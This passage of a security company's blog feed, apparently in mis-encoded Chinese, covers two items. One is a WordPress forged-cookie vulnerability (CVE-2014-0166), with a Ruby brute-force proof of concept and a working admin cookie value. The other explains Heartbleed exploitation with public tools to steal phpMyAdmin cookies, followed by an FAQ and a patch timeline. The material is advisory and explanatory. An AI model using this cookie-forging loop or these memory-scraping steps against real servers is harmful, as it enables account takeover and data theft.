class=&quot;s2&quot;&gt;=admin%7C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%7C0&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;include?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;logout&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;admin%7C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%7C0&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;è¨»ï¼šæ­¤ç¨‹å¼ç‚º POCï¼Œè«‹è‡ªè¡Œèª¿æ•´ç‚ºå¤šåŸ·è¡Œç·’ç‰ˆæœ¬ï¼Œä¸ç„¶é€Ÿåº¦æœƒå¾ˆæ…¢ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ç¶“éä¸€æ®µé•·æ™‚é–“çš„ç­‰å¾…ï¼Œå¾—åˆ°çš„çµæœå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140416/iTerm.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140416/iTerm.png&quot; alt=&quot;æš´åŠ›å½é€  cookieï¼Œç›´åˆ°æˆåŠŸç™»å…¥&quot; title=&quot;æš´åŠ›å½é€  cookieï¼Œç›´åˆ°æˆåŠŸç™»å…¥&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾—çŸ¥ç•¶ cookie ä¸­çš„ username ç‚º admin ä¸” expiration å€¼ç‚º 1421818232 æ™‚ï¼Œä¼ºæœå™¨ç®—å‡ºä¾†çš„ hmac ç¶“éå‹æ…‹è½‰æ›æœƒè®Šæˆ 0ã€‚æˆ‘å€‘å°‡æ¸¬è©¦æˆåŠŸçš„ cookie å€¼ï¼š admin%7C1421818232%7C0 è²¼åˆ°ç€è¦½å™¨ä¸Šã€‚æˆåŠŸè®Šæˆ admin å¦‚ä¸‹åœ–ï¼Œå¯¦é©—æˆåŠŸï¼&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140416/Mantra1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140416/Mantra1.png&quot; alt=&quot;åˆ©ç”¨å½é€ çš„ cookie ç™»å…¥ WordPress&quot; title=&quot;åˆ©ç”¨å½é€ çš„ cookie ç™»å…¥ WordPress&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;è¨»ï¼šä¸€èˆ¬ç‹€æ³ï¼Œè‹¥ä¸çŸ¥é“ WordPress æœ€é«˜æ¬Šé™çš„å¸³è™Ÿï¼Œå¯ä»¥åˆ©ç”¨ WordPress çš„ feature åœ¨ http://your.WordPress.com/?author=$id ($id: 1,2,3,4â€¦,999,â€¦) é é¢ä¸­åˆ—èˆ‰æ‰€æœ‰ä½¿ç”¨è€…å¸³è™Ÿã€‚é€šå¸¸ $id = 1 çš„ author éƒ½æœ‰ WordPress çš„ç®¡ç†æ¬Šé™ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;æœ€è¿‘å‡ºç¾äº†ä¸€å€‹é«˜é¢¨éšªé€šå ± CVE-2014-0166ï¼Œå…¶ä¸­æåŠ WordPress åœ¨èˆŠç‰ˆé©—è­‰ cookie çš„éƒ¨åˆ†å‡ºç¾å¼±é»ï¼Œå¯ä»¥å½é€ åˆæ³• cookieï¼Œé€²è€Œå–å¾— WordPress ç®¡ç†æ¬Šé™ã€‚æœ¬æ–‡åˆ†æäº†å…¶åŸç†ï¼Œä¸¦ä¸”è­‰å¯¦ä¹‹ã€‚&lt;/p&gt;

&lt;p&gt;å°æ–¼æ”»æ“Šè€…è€Œè¨€ï¼Œé›–ç„¶æ¯æ¬¡å½é€  cookie æˆåŠŸçš„æ©Ÿç‡ç´„ç‚ºä¸‰å„„åˆ†ä¹‹ä¸€ä¸¦ä¸é«˜ï¼Œä½†ç™¼é€ä¸‰å„„å€‹ request å¾Œæˆ–è¨±èƒ½æ‹¿åˆ°æœ€é«˜æ¬Šé™ï¼Œå·²ç¶“æ˜¯å€¼å¾—æŠ•è³‡çš„ç´šæ•¸ã€‚&lt;/p&gt;

&lt;p&gt;å°æ–¼ WordPress ç®¡ç†è€…è€Œè¨€ï¼Œå»ºè­°ç«‹å³æ›´æ–°è‡³ 3.8.2 ä»¥å¾Œç‰ˆæœ¬ï¼Œä»¥å…å—åˆ°æ­¤é¢¨éšªæ”»æ“Šã€‚&lt;/p&gt;

&lt;p&gt;å¾æ­¤äº‹ä»¶ä¹Ÿæé†’äº† PHP é–‹ç™¼è€…ï¼Œåœ¨æ’°å¯«é‡è¦çš„é©—è­‰è¡Œç‚ºï¼Œè¦ç‰¹åˆ¥æ³¨æ„ PHP æ¯”è¼ƒé‹ç®—å­çš„ç‰¹æ€§ï¼Œè«‹ä½¿ç”¨ === (ä¸ç­‰æ–¼è«‹ç”¨ !==)ä¾†ä¿è­‰ç­‰å¼å·¦å³å‹æ…‹èˆ‡å€¼ç‚ºä¸€æ¨£ï¼Œé¿å…å› ç‚ºè½‰å‹é€ æˆçš„è³‡å®‰é¢¨éšªã€‚&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities/</link>
                <guid>https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities</guid>
                <pubDate>Wed, 16 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL Heartbleed å…¨çƒé§­å®¢çš„æ®ºæˆ®ç¥­å…¸ï¼Œä½ åƒèˆ‡äº†å—ï¼Ÿ</title>
                <description>&lt;p&gt;ä½ è·Ÿä¸Šäº† OpenSSL Heartbleed çš„ç¥­å…¸äº†å—ï¼Ÿå¦‚æœé‚„æ²’æœ‰ï¼Œåˆ¥å¿˜è¨˜è©³ç´°é–±è®€ä¸€ä¸‹æˆ‘å€‘çš„å‰æ–‡ã€Œ&lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed åš´é‡æ¼æ´&lt;/a&gt;ã€ã€‚&lt;/p&gt;

&lt;p&gt;é€™å¹¾å¤©ä¸å°‘ä¼æ¥­ã€æ°‘çœ¾éƒ½ä¸æ–·ä¾†è©¢å•æˆ‘å€‘ç›¸å°æ‡‰çš„è§£æ±ºæ–¹æ¡ˆï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Heartbleed è·Ÿæˆ‘æœ‰é—œå—ï¼Ÿæˆ‘è©²æ€éº¼çŸ¥é“ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;æˆ‘è©²æ€éº¼æ›´æ–° OpenSSLï¼Ÿ&lt;/li&gt;
  &lt;li&gt;æˆ‘å¦‚æœä¸èƒ½æ›´æ–°ï¼Œè¦æ€éº¼é˜²æ­¢æ”»æ“Šï¼Ÿ&lt;/li&gt;
  &lt;li&gt;Heartbleed æ¼æ´æ”»æ“Šè€…æœƒæ€éº¼åˆ©ç”¨ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;ç›®å‰å—å®³çš„ç‹€æ³å¦‚ä½•ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;æˆ‘åªæ˜¯ä¸€èˆ¬æ°‘çœ¾ï¼Œè©²å¦‚ä½•æ‡‰å°ï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æˆ‘ç›¸ä¿¡ä¸å°‘äººéƒ½æœ‰é¡ä¼¼çš„ç–‘å•ï¼Œæˆ‘å€‘ä»¥é€™ç¯‡å°ˆæ–‡è£œéºä¸Šæ¬¡æ²’æåˆ°çš„è³‡è¨Šã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;æ”»æ“Šæ‰‹æ³•ç¤ºç¯„&quot;&gt;æ”»æ“Šæ‰‹æ³•ç¤ºç¯„&lt;/h3&gt;

&lt;p&gt;å¤§å®¶éƒ½èªª OpenSSL Heartbleed æ¼æ´å¯æœ›ç‚ºæœ¬å¹´åº¦æœ€åš´é‡çš„æ¼æ´ï¼Œåˆ°åº•æœ‰å¤šåš´é‡å‘¢ï¼Ÿæˆ‘ç›¸ä¿¡æ²’æœ‰çœ‹åˆ°æ”»æ“Šçš„ç¯„ä¾‹æ˜¯æ²’æœ‰æ„Ÿè¦ºçš„ã€‚å¤§å®¶å¯ä»¥å…ˆçœ‹çœ‹ä»¥ä¸‹çš„å½±ç‰‡ï¼Œåˆ©ç”¨æœ€å…ˆé‡‹å‡ºçš„å…©å€‹ç°¡å–®çš„ PoC exploit ï¼ˆå¼±é»åˆ©ç”¨ç¨‹å¼ï¼‰ã€Œssltest.pyã€ä»¥åŠã€Œcheck-ssl-heartbleed.plã€ï¼Œä¾†æª¢æ¸¬ä¼ºæœå™¨æ˜¯å¦æœ‰ Heartbleed å•é¡Œã€‚æª¢æ¸¬çš„åŒæ™‚å¯ä»¥ç²å–ä¼ºæœå™¨è¨˜æ†¶é«”ä¸­çš„è³‡è¨Šï¼Œå…¶ä¸­å°±å¯èƒ½åŒ…å«äº†æ©Ÿæ•è³‡è¨Šã€‚&lt;/p&gt;

&lt;p&gt;è®“æˆ‘å€‘ä¾†çœ‹çœ‹å§ï¼&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/kFGzu0-cIxE&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;é¦–å…ˆåˆ©ç”¨ &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;ssltest.py&lt;/a&gt; ä¾†æ¸¬è©¦ï¼Œä¾†çœ‹ä¼ºæœå™¨æ˜¯å¦æœ‰è¢« heartbleed æ¼æ´å½±éŸ¿ï¼Œfbi.gov åœ¨ç¬¬ä¸‰å¤©å·²ç¶“ä¿®å¾©é€™å€‹å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot; alt=&quot;åˆ©ç”¨ ssltest.py ä¾†æ¸¬è©¦ä¼ºæœå™¨æ˜¯å¦æœ‰ Heartbleed æ¼æ´ã€‚&quot; title=&quot;åˆ©ç”¨ ssltest.py ä¾†æ¸¬è©¦ä¼ºæœå™¨æ˜¯å¦æœ‰ Heartbleed æ¼æ´ã€‚&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœæ˜¯æª¢æ¸¬ä¸€å€‹æœ‰æ¼æ´çš„ç¶²ç«™ï¼Œé€™å€‹å·¥å…·æœƒç›´æ¥æŠŠè¨˜æ†¶é«”çš„å…§å®¹é¡¯ç¤ºå‡ºä¾†ï¼Œå…¶ä¸­å¯èƒ½åŒ…æ‹¬ http å‚³è¼¸çš„è³‡æ–™ã€å¸³è™Ÿå¯†ç¢¼ã€ç§å¯†é‡‘é‘°ç­‰ã€‚åœ¨é€™å€‹ä¾‹å­ä¸­ï¼Œæ”»æ“Šç¨‹å¼è®€å–åˆ°ä½¿ç”¨è€…é€å‡ºçš„ formï¼Œè‹¥å…¶ä¸­åŒ…å«å€‹è³‡å°‡æœƒè¢«ä¸€è¦½ç„¡éºï¼Œéå¸¸å±éšªã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot; alt=&quot;åˆ©ç”¨ ssltest.py æŠ“å‡ºè¨˜æ†¶é«”ä¸­çš„è³‡æ–™ï¼Œå…¶ä¸­åŒ…æ‹¬ HTTP å‚³è¼¸å…§å®¹ã€‚&quot; title=&quot;åˆ©ç”¨ ssltest.py æŠ“å‡ºè¨˜æ†¶é«”ä¸­çš„è³‡æ–™ï¼Œå…¶ä¸­åŒ…æ‹¬ HTTP å‚³è¼¸å…§å®¹ã€‚&quot; /&gt;&lt;br /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦ä¸€å€‹å·¥å…· &lt;a href=&quot;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&quot;&gt;check-ssl-heartbleed.pl&lt;/a&gt; å¯ä»¥ä½¿ç”¨ -R åƒæ•¸åšæ›´æœ‰æ•ˆçš„åˆ©ç”¨ã€‚ç›´æ¥åŸ·è¡ŒæŒ‡ä»¤å¯ä»¥å¿«é€Ÿé¡¯ç¤ºä¼ºæœå™¨æœ‰ç„¡å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot; alt=&quot;åˆ©ç”¨ check-ssl-heartbleed.pl ä¾†æª¢æŸ¥ä¼ºæœå™¨æ˜¯å¦æœ‰ heartbleed å•é¡Œã€‚&quot; title=&quot;åˆ©ç”¨ check-ssl-heartbleed.pl ä¾†æª¢æŸ¥ä¼ºæœå™¨æ˜¯å¦æœ‰ heartbleed å•é¡Œã€‚&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœä½¿ç”¨ã€Œ-Rã€åƒæ•¸ä¸¦ä¸”æŒ‡å®šç‰¹å®šçš„æ­£è¦è¡¨ç¤ºå¼ï¼Œå¯ä»¥æŠ“å‡ºæƒ³è¦ç²å–çš„è³‡æ–™ã€‚ä¾‹å¦‚ Cookieã€å¸³è™Ÿå¯†ç¢¼ç­‰ã€‚ä»¥æ­¤ä¾‹ï¼Œæˆ‘å€‘çŸ¥é“é€™å€‹ç¶²ç«™æä¾› &lt;a href=&quot;http://www.phpmyadmin.net&quot;&gt;phpMyAdmin&lt;/a&gt; å¥—ä»¶ï¼Œå› æ­¤ç›´æ¥é–å®šã€ŒpmaPassã€è³‡æ–™ä¾†æŠ“å–ï¼Œæ²’æƒ³åˆ°ç¬¬ä¸€æ¬¡å°±æŠ“åˆ°äº†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot; alt=&quot;åˆ©ç”¨ check-ssl-heartbleed.pl æŠ“å‡ºç‰¹å®šæ©Ÿæ•è³‡æ–™ã€‚&quot; title=&quot;åˆ©ç”¨ check-ssl-heartbleed.pl æŠ“å‡ºç‰¹å®šæ©Ÿæ•è³‡æ–™ã€‚&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ¥è‘—æ”»æ“Šè€…åªè¦æŠŠé€™å€‹ç²å–åˆ°çš„ Cookie å­˜å…¥è‡ªå·±çš„ç€è¦½å™¨ä¸­ï¼Œå°±å¯ä»¥å¦‚å½±ç‰‡ä¸­ç›œç”¨é€™å€‹å¸³è™Ÿã€‚æ˜¯å¦å¾ˆå±éšªå‘¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;é™¤äº†é€™ç¨®åˆ©ç”¨æ–¹æ³•ä¹‹å¤–ï¼Œé‚„æœ‰æ›´å¤šæƒ…æ³æ˜¯ç›´æ¥æŠŠä½¿ç”¨è€…ç™»å…¥çš„å¸³è™Ÿå¯†ç¢¼ç›´æ¥é¡¯ç¤ºå‡ºä¾†çš„ï¼Œå› æ­¤å¦‚æœä¼ºæœå™¨æ²’æœ‰åšå¥½é˜²ç¦¦æˆ–æ›´æ–°ï¼Œæ•´å€‹ç¶²ç«™çš„ä½¿ç”¨è€…è³‡æ–™éƒ½å¯ä»¥å› æ­¤å¤–æ´©ã€‚é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘å€‘ä¸€ç›´å¼·èª¿ä¼ºæœå™¨ç®¡ç†è€…å¿…é ˆè¦æ›´æ–°é‡‘é‘°ã€å…¨ç«™ä½¿ç”¨è€…å¸³è™Ÿå¯†ç¢¼ç­‰ï¼Œä»¥é˜²æœ‰å¿ƒäººå£«å€Ÿæ­¤æ’ˆå–è³‡æ–™ã€‚&lt;/p&gt;

&lt;h3 id=&quot;èª°åœ¨åˆ©ç”¨-heartbleed-æ¼æ´ç«Šå–è³‡æ–™å‘¢&quot;&gt;èª°åœ¨åˆ©ç”¨ Heartbleed æ¼æ´ç«Šå–è³‡æ–™å‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ç”± github ä¸Šé¢çš„ &lt;a href=&quot;https://github.com/openssl/openssl/commit/4817504d069b4c5082161b02a22116ad75f822b1&quot;&gt;commit è¨˜éŒ„&lt;/a&gt;ï¼Œå‡ºå•é¡Œçš„é‚£è¡Œç¨‹å¼ç¢¼æ˜¯åœ¨ 2011-12-31 22:59:57 commit çš„ï¼Œä¸çŸ¥é“æ˜¯é–‹ç™¼è€…å¤ªç´¯é‚„æ˜¯ NSA çš„é™°è¬€ã€‚æ ¹æ“š Bloomberg çš„&lt;a href=&quot;http://www.bloomberg.com/news/2014-04-11/nsa-said-to-have-used-heartbleed-bug-exposing-consumers.html&quot;&gt;å ±å°&lt;/a&gt;æŒ‡å‡ºï¼ŒçŸ¥æƒ…äººå£«è¡¨ç¤º NSA æ—©åœ¨&lt;strong&gt;å…©å¹´å‰&lt;/strong&gt;å°±å·²ç¶“çŸ¥é“æ­¤æ¼æ´ï¼Œä¸¦ä¸”&lt;strong&gt;åˆ©ç”¨é€™å€‹æ¼æ´ç«Šå–è¨±å¤šç¶²ç«™çš„æ©Ÿæ•è³‡æ–™&lt;/strong&gt;ã€‚é€™ä»£è¡¨ NSA åœ¨ä¸€é–‹å§‹å°±çŸ¥é“é€™å€‹æ¼æ´ï¼Œä»¤äººä¸ç¦æœ‰å…¶ä»–è¯æƒ³ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The U.S. National Security Agency knew for at least two years about a flaw in the way that many websites send sensitive information, now dubbed the Heartbleed bug, and regularly used it to gather critical intelligence, two people familiar with the matter said.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åœ¨ä¹‹å‰&lt;a href=&quot;http://hitcon.org&quot;&gt;å°ç£é§­å®¢å¹´æœƒ (HITCON)&lt;/a&gt; 2013 çš„è¬›å¸« Rahul Sasi (Garage4Hackers) å…¬å¸ƒäº†&lt;a href=&quot;https://bitbucket.org/fb1h2s/cve-2014-0160/src/bba16b3eedef0e92bd91fea496b00c92eb515e29/Heartbeat_scanner.py?at=master&quot;&gt;å¤§é‡æƒæ Heartbleed æ¼æ´çš„ç¨‹å¼&lt;/a&gt;ï¼Œä¹Ÿå¯ä»¥ä¾›ç ”ç©¶äººå“¡è‡ªè¡Œç ”ç©¶ï¼Œæˆ–è€…æ˜¯å°‹æ‰¾è‡ªå·±ç®¡ç†çš„ä¸»æ©Ÿä¸­æœ‰å¤šå°‘åŒ…å«é€™å€‹é¢¨éšªçš„ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å¸¸è¦‹å•é¡Œ&quot;&gt;å¸¸è¦‹å•é¡Œ&lt;/h3&gt;

&lt;h3 id=&quot;openssl-æ˜¯ä»€éº¼iis-æœƒå—-heartbleed-æ¼æ´å½±éŸ¿å—&quot;&gt;OpenSSL æ˜¯ä»€éº¼ï¼ŸIIS æœƒå— Heartbleed æ¼æ´å½±éŸ¿å—ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.openssl.org&quot;&gt;OpenSSL&lt;/a&gt; æ˜¯ä¸€å€‹å‡½å¼åº«ï¼ˆLibraryï¼‰ï¼Œåœ¨ UNIX ç³»åˆ—çš„æœå‹™è‹¥æœ‰ä½¿ç”¨ SSLï¼Œé€šå¸¸éƒ½æœƒä½¿ç”¨ OpenSSLã€‚å› æ­¤é€™æ¬¡çš„æ¼æ´ä¸¦æœªå½±éŸ¿å¾®è»Ÿ IISã€‚&lt;/p&gt;

&lt;h3 id=&quot;æˆ‘ä½¿ç”¨-openssl-098å¤ªå¥½äº†æˆ‘ç”¨èˆŠç‰ˆæˆ‘å¥½å®‰å…¨&quot;&gt;æˆ‘ä½¿ç”¨ OpenSSL 0.9.8ï¼Œå¤ªå¥½äº†æˆ‘ç”¨èˆŠç‰ˆæˆ‘å¥½å®‰å…¨ï¼&lt;/h3&gt;

&lt;p&gt;ä½ è½é &lt;a href=&quot;http://en.wikipedia.org/wiki/Transport_Layer_Security#BEAST_attack&quot;&gt;BEAST&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/BREACH_%28security_exploit%29&quot;&gt;BREACH&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/CRIME_%28security_exploit%29&quot;&gt;CRIME&lt;/a&gt;, &lt;a href=&quot;http://www.isg.rhul.ac.uk/tls/Lucky13.html&quot;&gt;Lucky 13&lt;/a&gt; å—ï¼Ÿ&lt;/p&gt;

&lt;h3 id=&quot;æˆ‘æ²’æœ‰ä½¿ç”¨-httpsæ‰€ä»¥æˆ‘å¾ˆå®‰å…¨&quot;&gt;æˆ‘æ²’æœ‰ä½¿ç”¨ HTTPSï¼Œæ‰€ä»¥æˆ‘å¾ˆå®‰å…¨ï¼&lt;/h3&gt;

&lt;p&gt;ã€‚ã€‚ã€‚&lt;/p&gt;

&lt;h3 id=&quot;åªæœ‰ç¶²é ä¼ºæœå™¨http-serveræœƒå—å½±éŸ¿å—&quot;&gt;åªæœ‰ç¶²é ä¼ºæœå™¨ï¼ˆHTTP Serverï¼‰æœƒå—å½±éŸ¿å—ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ä¸åªï¼åªè¦ä½¿ç”¨ OpenSSL æ”¯æ´ STARTTLS çš„æœå‹™éƒ½åœ¨å½±éŸ¿ç¯„åœï¼ŒåŒ…æ‹¬ HTTPSã€IMAPSã€POPSã€SMTPS ç­‰ä¼ºæœå™¨ã€‚&lt;/p&gt;

&lt;h3 id=&quot;åªæœ‰è‡ªå·±æ¶è¨­çš„ä¼ºæœå™¨æœƒå—å½±éŸ¿å—&quot;&gt;åªæœ‰è‡ªå·±æ¶è¨­çš„ä¼ºæœå™¨æœƒå—å½±éŸ¿å—ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ç•¶ç„¶ä¸åªï¼ç›®å‰å·²ç¶“å‡ºç¾å„å¤§è¨­å‚™å» å•†éƒ½é­é‡åˆ°é€™æ¨£çš„å•é¡Œã€‚å„å¤§è¨­å‚™å» å•†ã€ä½œæ¥­ç³»çµ±ç­‰å½±éŸ¿ç‹€æ³ï¼Œå¯ä»¥åƒé–±ä»¥ä¸‹æ–‡ç« ã€‚&lt;/p&gt;

&lt;p&gt;CERT: OpenSSL heartbeat extension read overflow discloses sensitive information&lt;br /&gt;
&lt;a href=&quot;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=720951&amp;amp;SearchOrder=4&quot;&gt;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=720951&amp;amp;SearchOrder=4&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å» å•†çš„è¨­å‚™ç›®å‰ç‹€æ³ç‰¹åˆ¥åš´é‡ï¼Œå› ç‚ºæ‰€æœ‰åŒå€‹ç‰ˆæœ¬çš„è¨­å‚™éƒ½æœƒå—å½±éŸ¿ï¼Œè€Œåœ¨å» å•†é‡‹å‡ºæ›´æ–°ä¹‹å‰ï¼Œåªèƒ½è¢«å‹•çš„ç­‰å¾…æ›´æ–°ã€‚è‹¥æ²’æœ‰ç¹¼çºŒç°½è¨‚ç¶­è­·ç´„çš„è¨­å‚™ï¼Œä¹Ÿåªèƒ½ç¹¼çºŒè·Ÿå» å•†ç°½ç´„æ›´æ–°ï¼Œæˆ–è€…æ˜¯çœ‹å» å•†æ˜¯å¦å¯ä»¥ç›´æ¥æä¾›æ›´æ–°æª”ã€‚å¦‚æœæœ‰ VPN Server ç­‰æœå‹™æ›´è¦æ³¨æ„ï¼Œå¦‚æœè¢«æ”»æ“Šè€…å–å¾—å¸³è™Ÿå¯†ç¢¼ï¼Œç­‰æ–¼å¦‚å…¥ç„¡äººä¹‹å¢ƒï¼Œç›´æ¥ä½¿ç”¨ä½ çš„å¸³è™Ÿç™»å…¥åˆ°ä¼æ¥­å…§ç¶²ï¼Œä¸å¯ä¸æ…ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å„å®¶ç³»çµ±æ›´æ–°çš„é€Ÿåº¦&quot;&gt;å„å®¶ç³»çµ±æ›´æ–°çš„é€Ÿåº¦ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;å¼•è¿°è‡ªå¥½æœ‹å‹ Ant çš„&lt;a href=&quot;http://blog.gcos.me/2014-04-10_openssl-cve-2014-0160-security-issue.html&quot;&gt;æ–‡ç« &lt;/a&gt;ï¼Œå„å®¶ä½œæ¥­ç³»çµ±ã€ç¶²ç«™çš„æ›´æ–°é€Ÿåº¦ï¼Œä»£è¡¨è‘—ä¼æ¥­é‡è¦–è³‡å®‰çš„ç¨‹åº¦ä»¥åŠé‡å°è³‡å®‰äº‹ä»¶ç·Šæ€¥æ‡‰è®Šçš„æ•ˆç‡ï¼Œä¹Ÿå¯ä»¥ä½œç‚ºæˆ‘å€‘æŒ‘é¸ç³»çµ±ã€ç¶²ç«™ã€å» å•†çš„ä¾æ“šã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;äºŒã€ä½œæ¥­ç³»çµ±çš„æ›´æ–°é€²åº¦&lt;/p&gt;

  &lt;p&gt;å¾è³‡å®‰äº‹ä»¶çš„è™•ç†å¯ä»¥æ¨æ•²å‡ºå„ä½œæ¥­ç³»çµ±å•†å°æ–¼ç·Šæ€¥äº‹ä»¶çš„åæ‡‰é€Ÿåº¦ã€‚&lt;br /&gt;
æ™‚é–“è»¸ï¼ŒæŒ‰ç…§ä¿®å¾©çš„å…ˆå¾Œæ’åˆ—ï¼š&lt;/p&gt;

  &lt;ol&gt;
    &lt;li&gt;OpenSSL (è³‡å®‰å¼±é»çš„ä¸»è§’) ç¬¬ä¸€æ¬¡å…¬é–‹æ­éœ²çš„æ™‚é–“ç´„åœ¨ 2014å¹´4æœˆ6æ—¥ 0æ™‚ã€‚&lt;/li&gt;
    &lt;li&gt;RedHat åœ¨ 2014å¹´4æœˆ7æ—¥ 07:47:00 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;OpenSSL æ­£å¼ç¢ºèªä¸¦ä¿®å¾©çš„æ™‚é–“ç´„åœ¨ 2014å¹´4æœˆ7æ—¥16æ™‚ã€‚&lt;/li&gt;
    &lt;li&gt;OpenBSD ç´„åœ¨ 2014å¹´4æœˆ7æ—¥ 20:17 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Arch Linux ç´„åœ¨ 2014å¹´4æœˆ7æ—¥ 20:36 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Debian ç´„åœ¨ 2014å¹´4æœˆ7æ—¥ 21:45 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;FreeBSD ç´„åœ¨ 2014å¹´4æœˆ7æ—¥ 21:46 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Ubuntu ç´„åœ¨ 2014å¹´4æœˆ7æ—¥ 21:48 æ­£å¼ä¿®å¾©ã€‚&lt;br /&gt;
(2014å¹´4æœˆ8æ—¥åˆ†éš”å€)&lt;/li&gt;
    &lt;li&gt;Fedora ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 00:33 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;CentOS ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 02:49 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
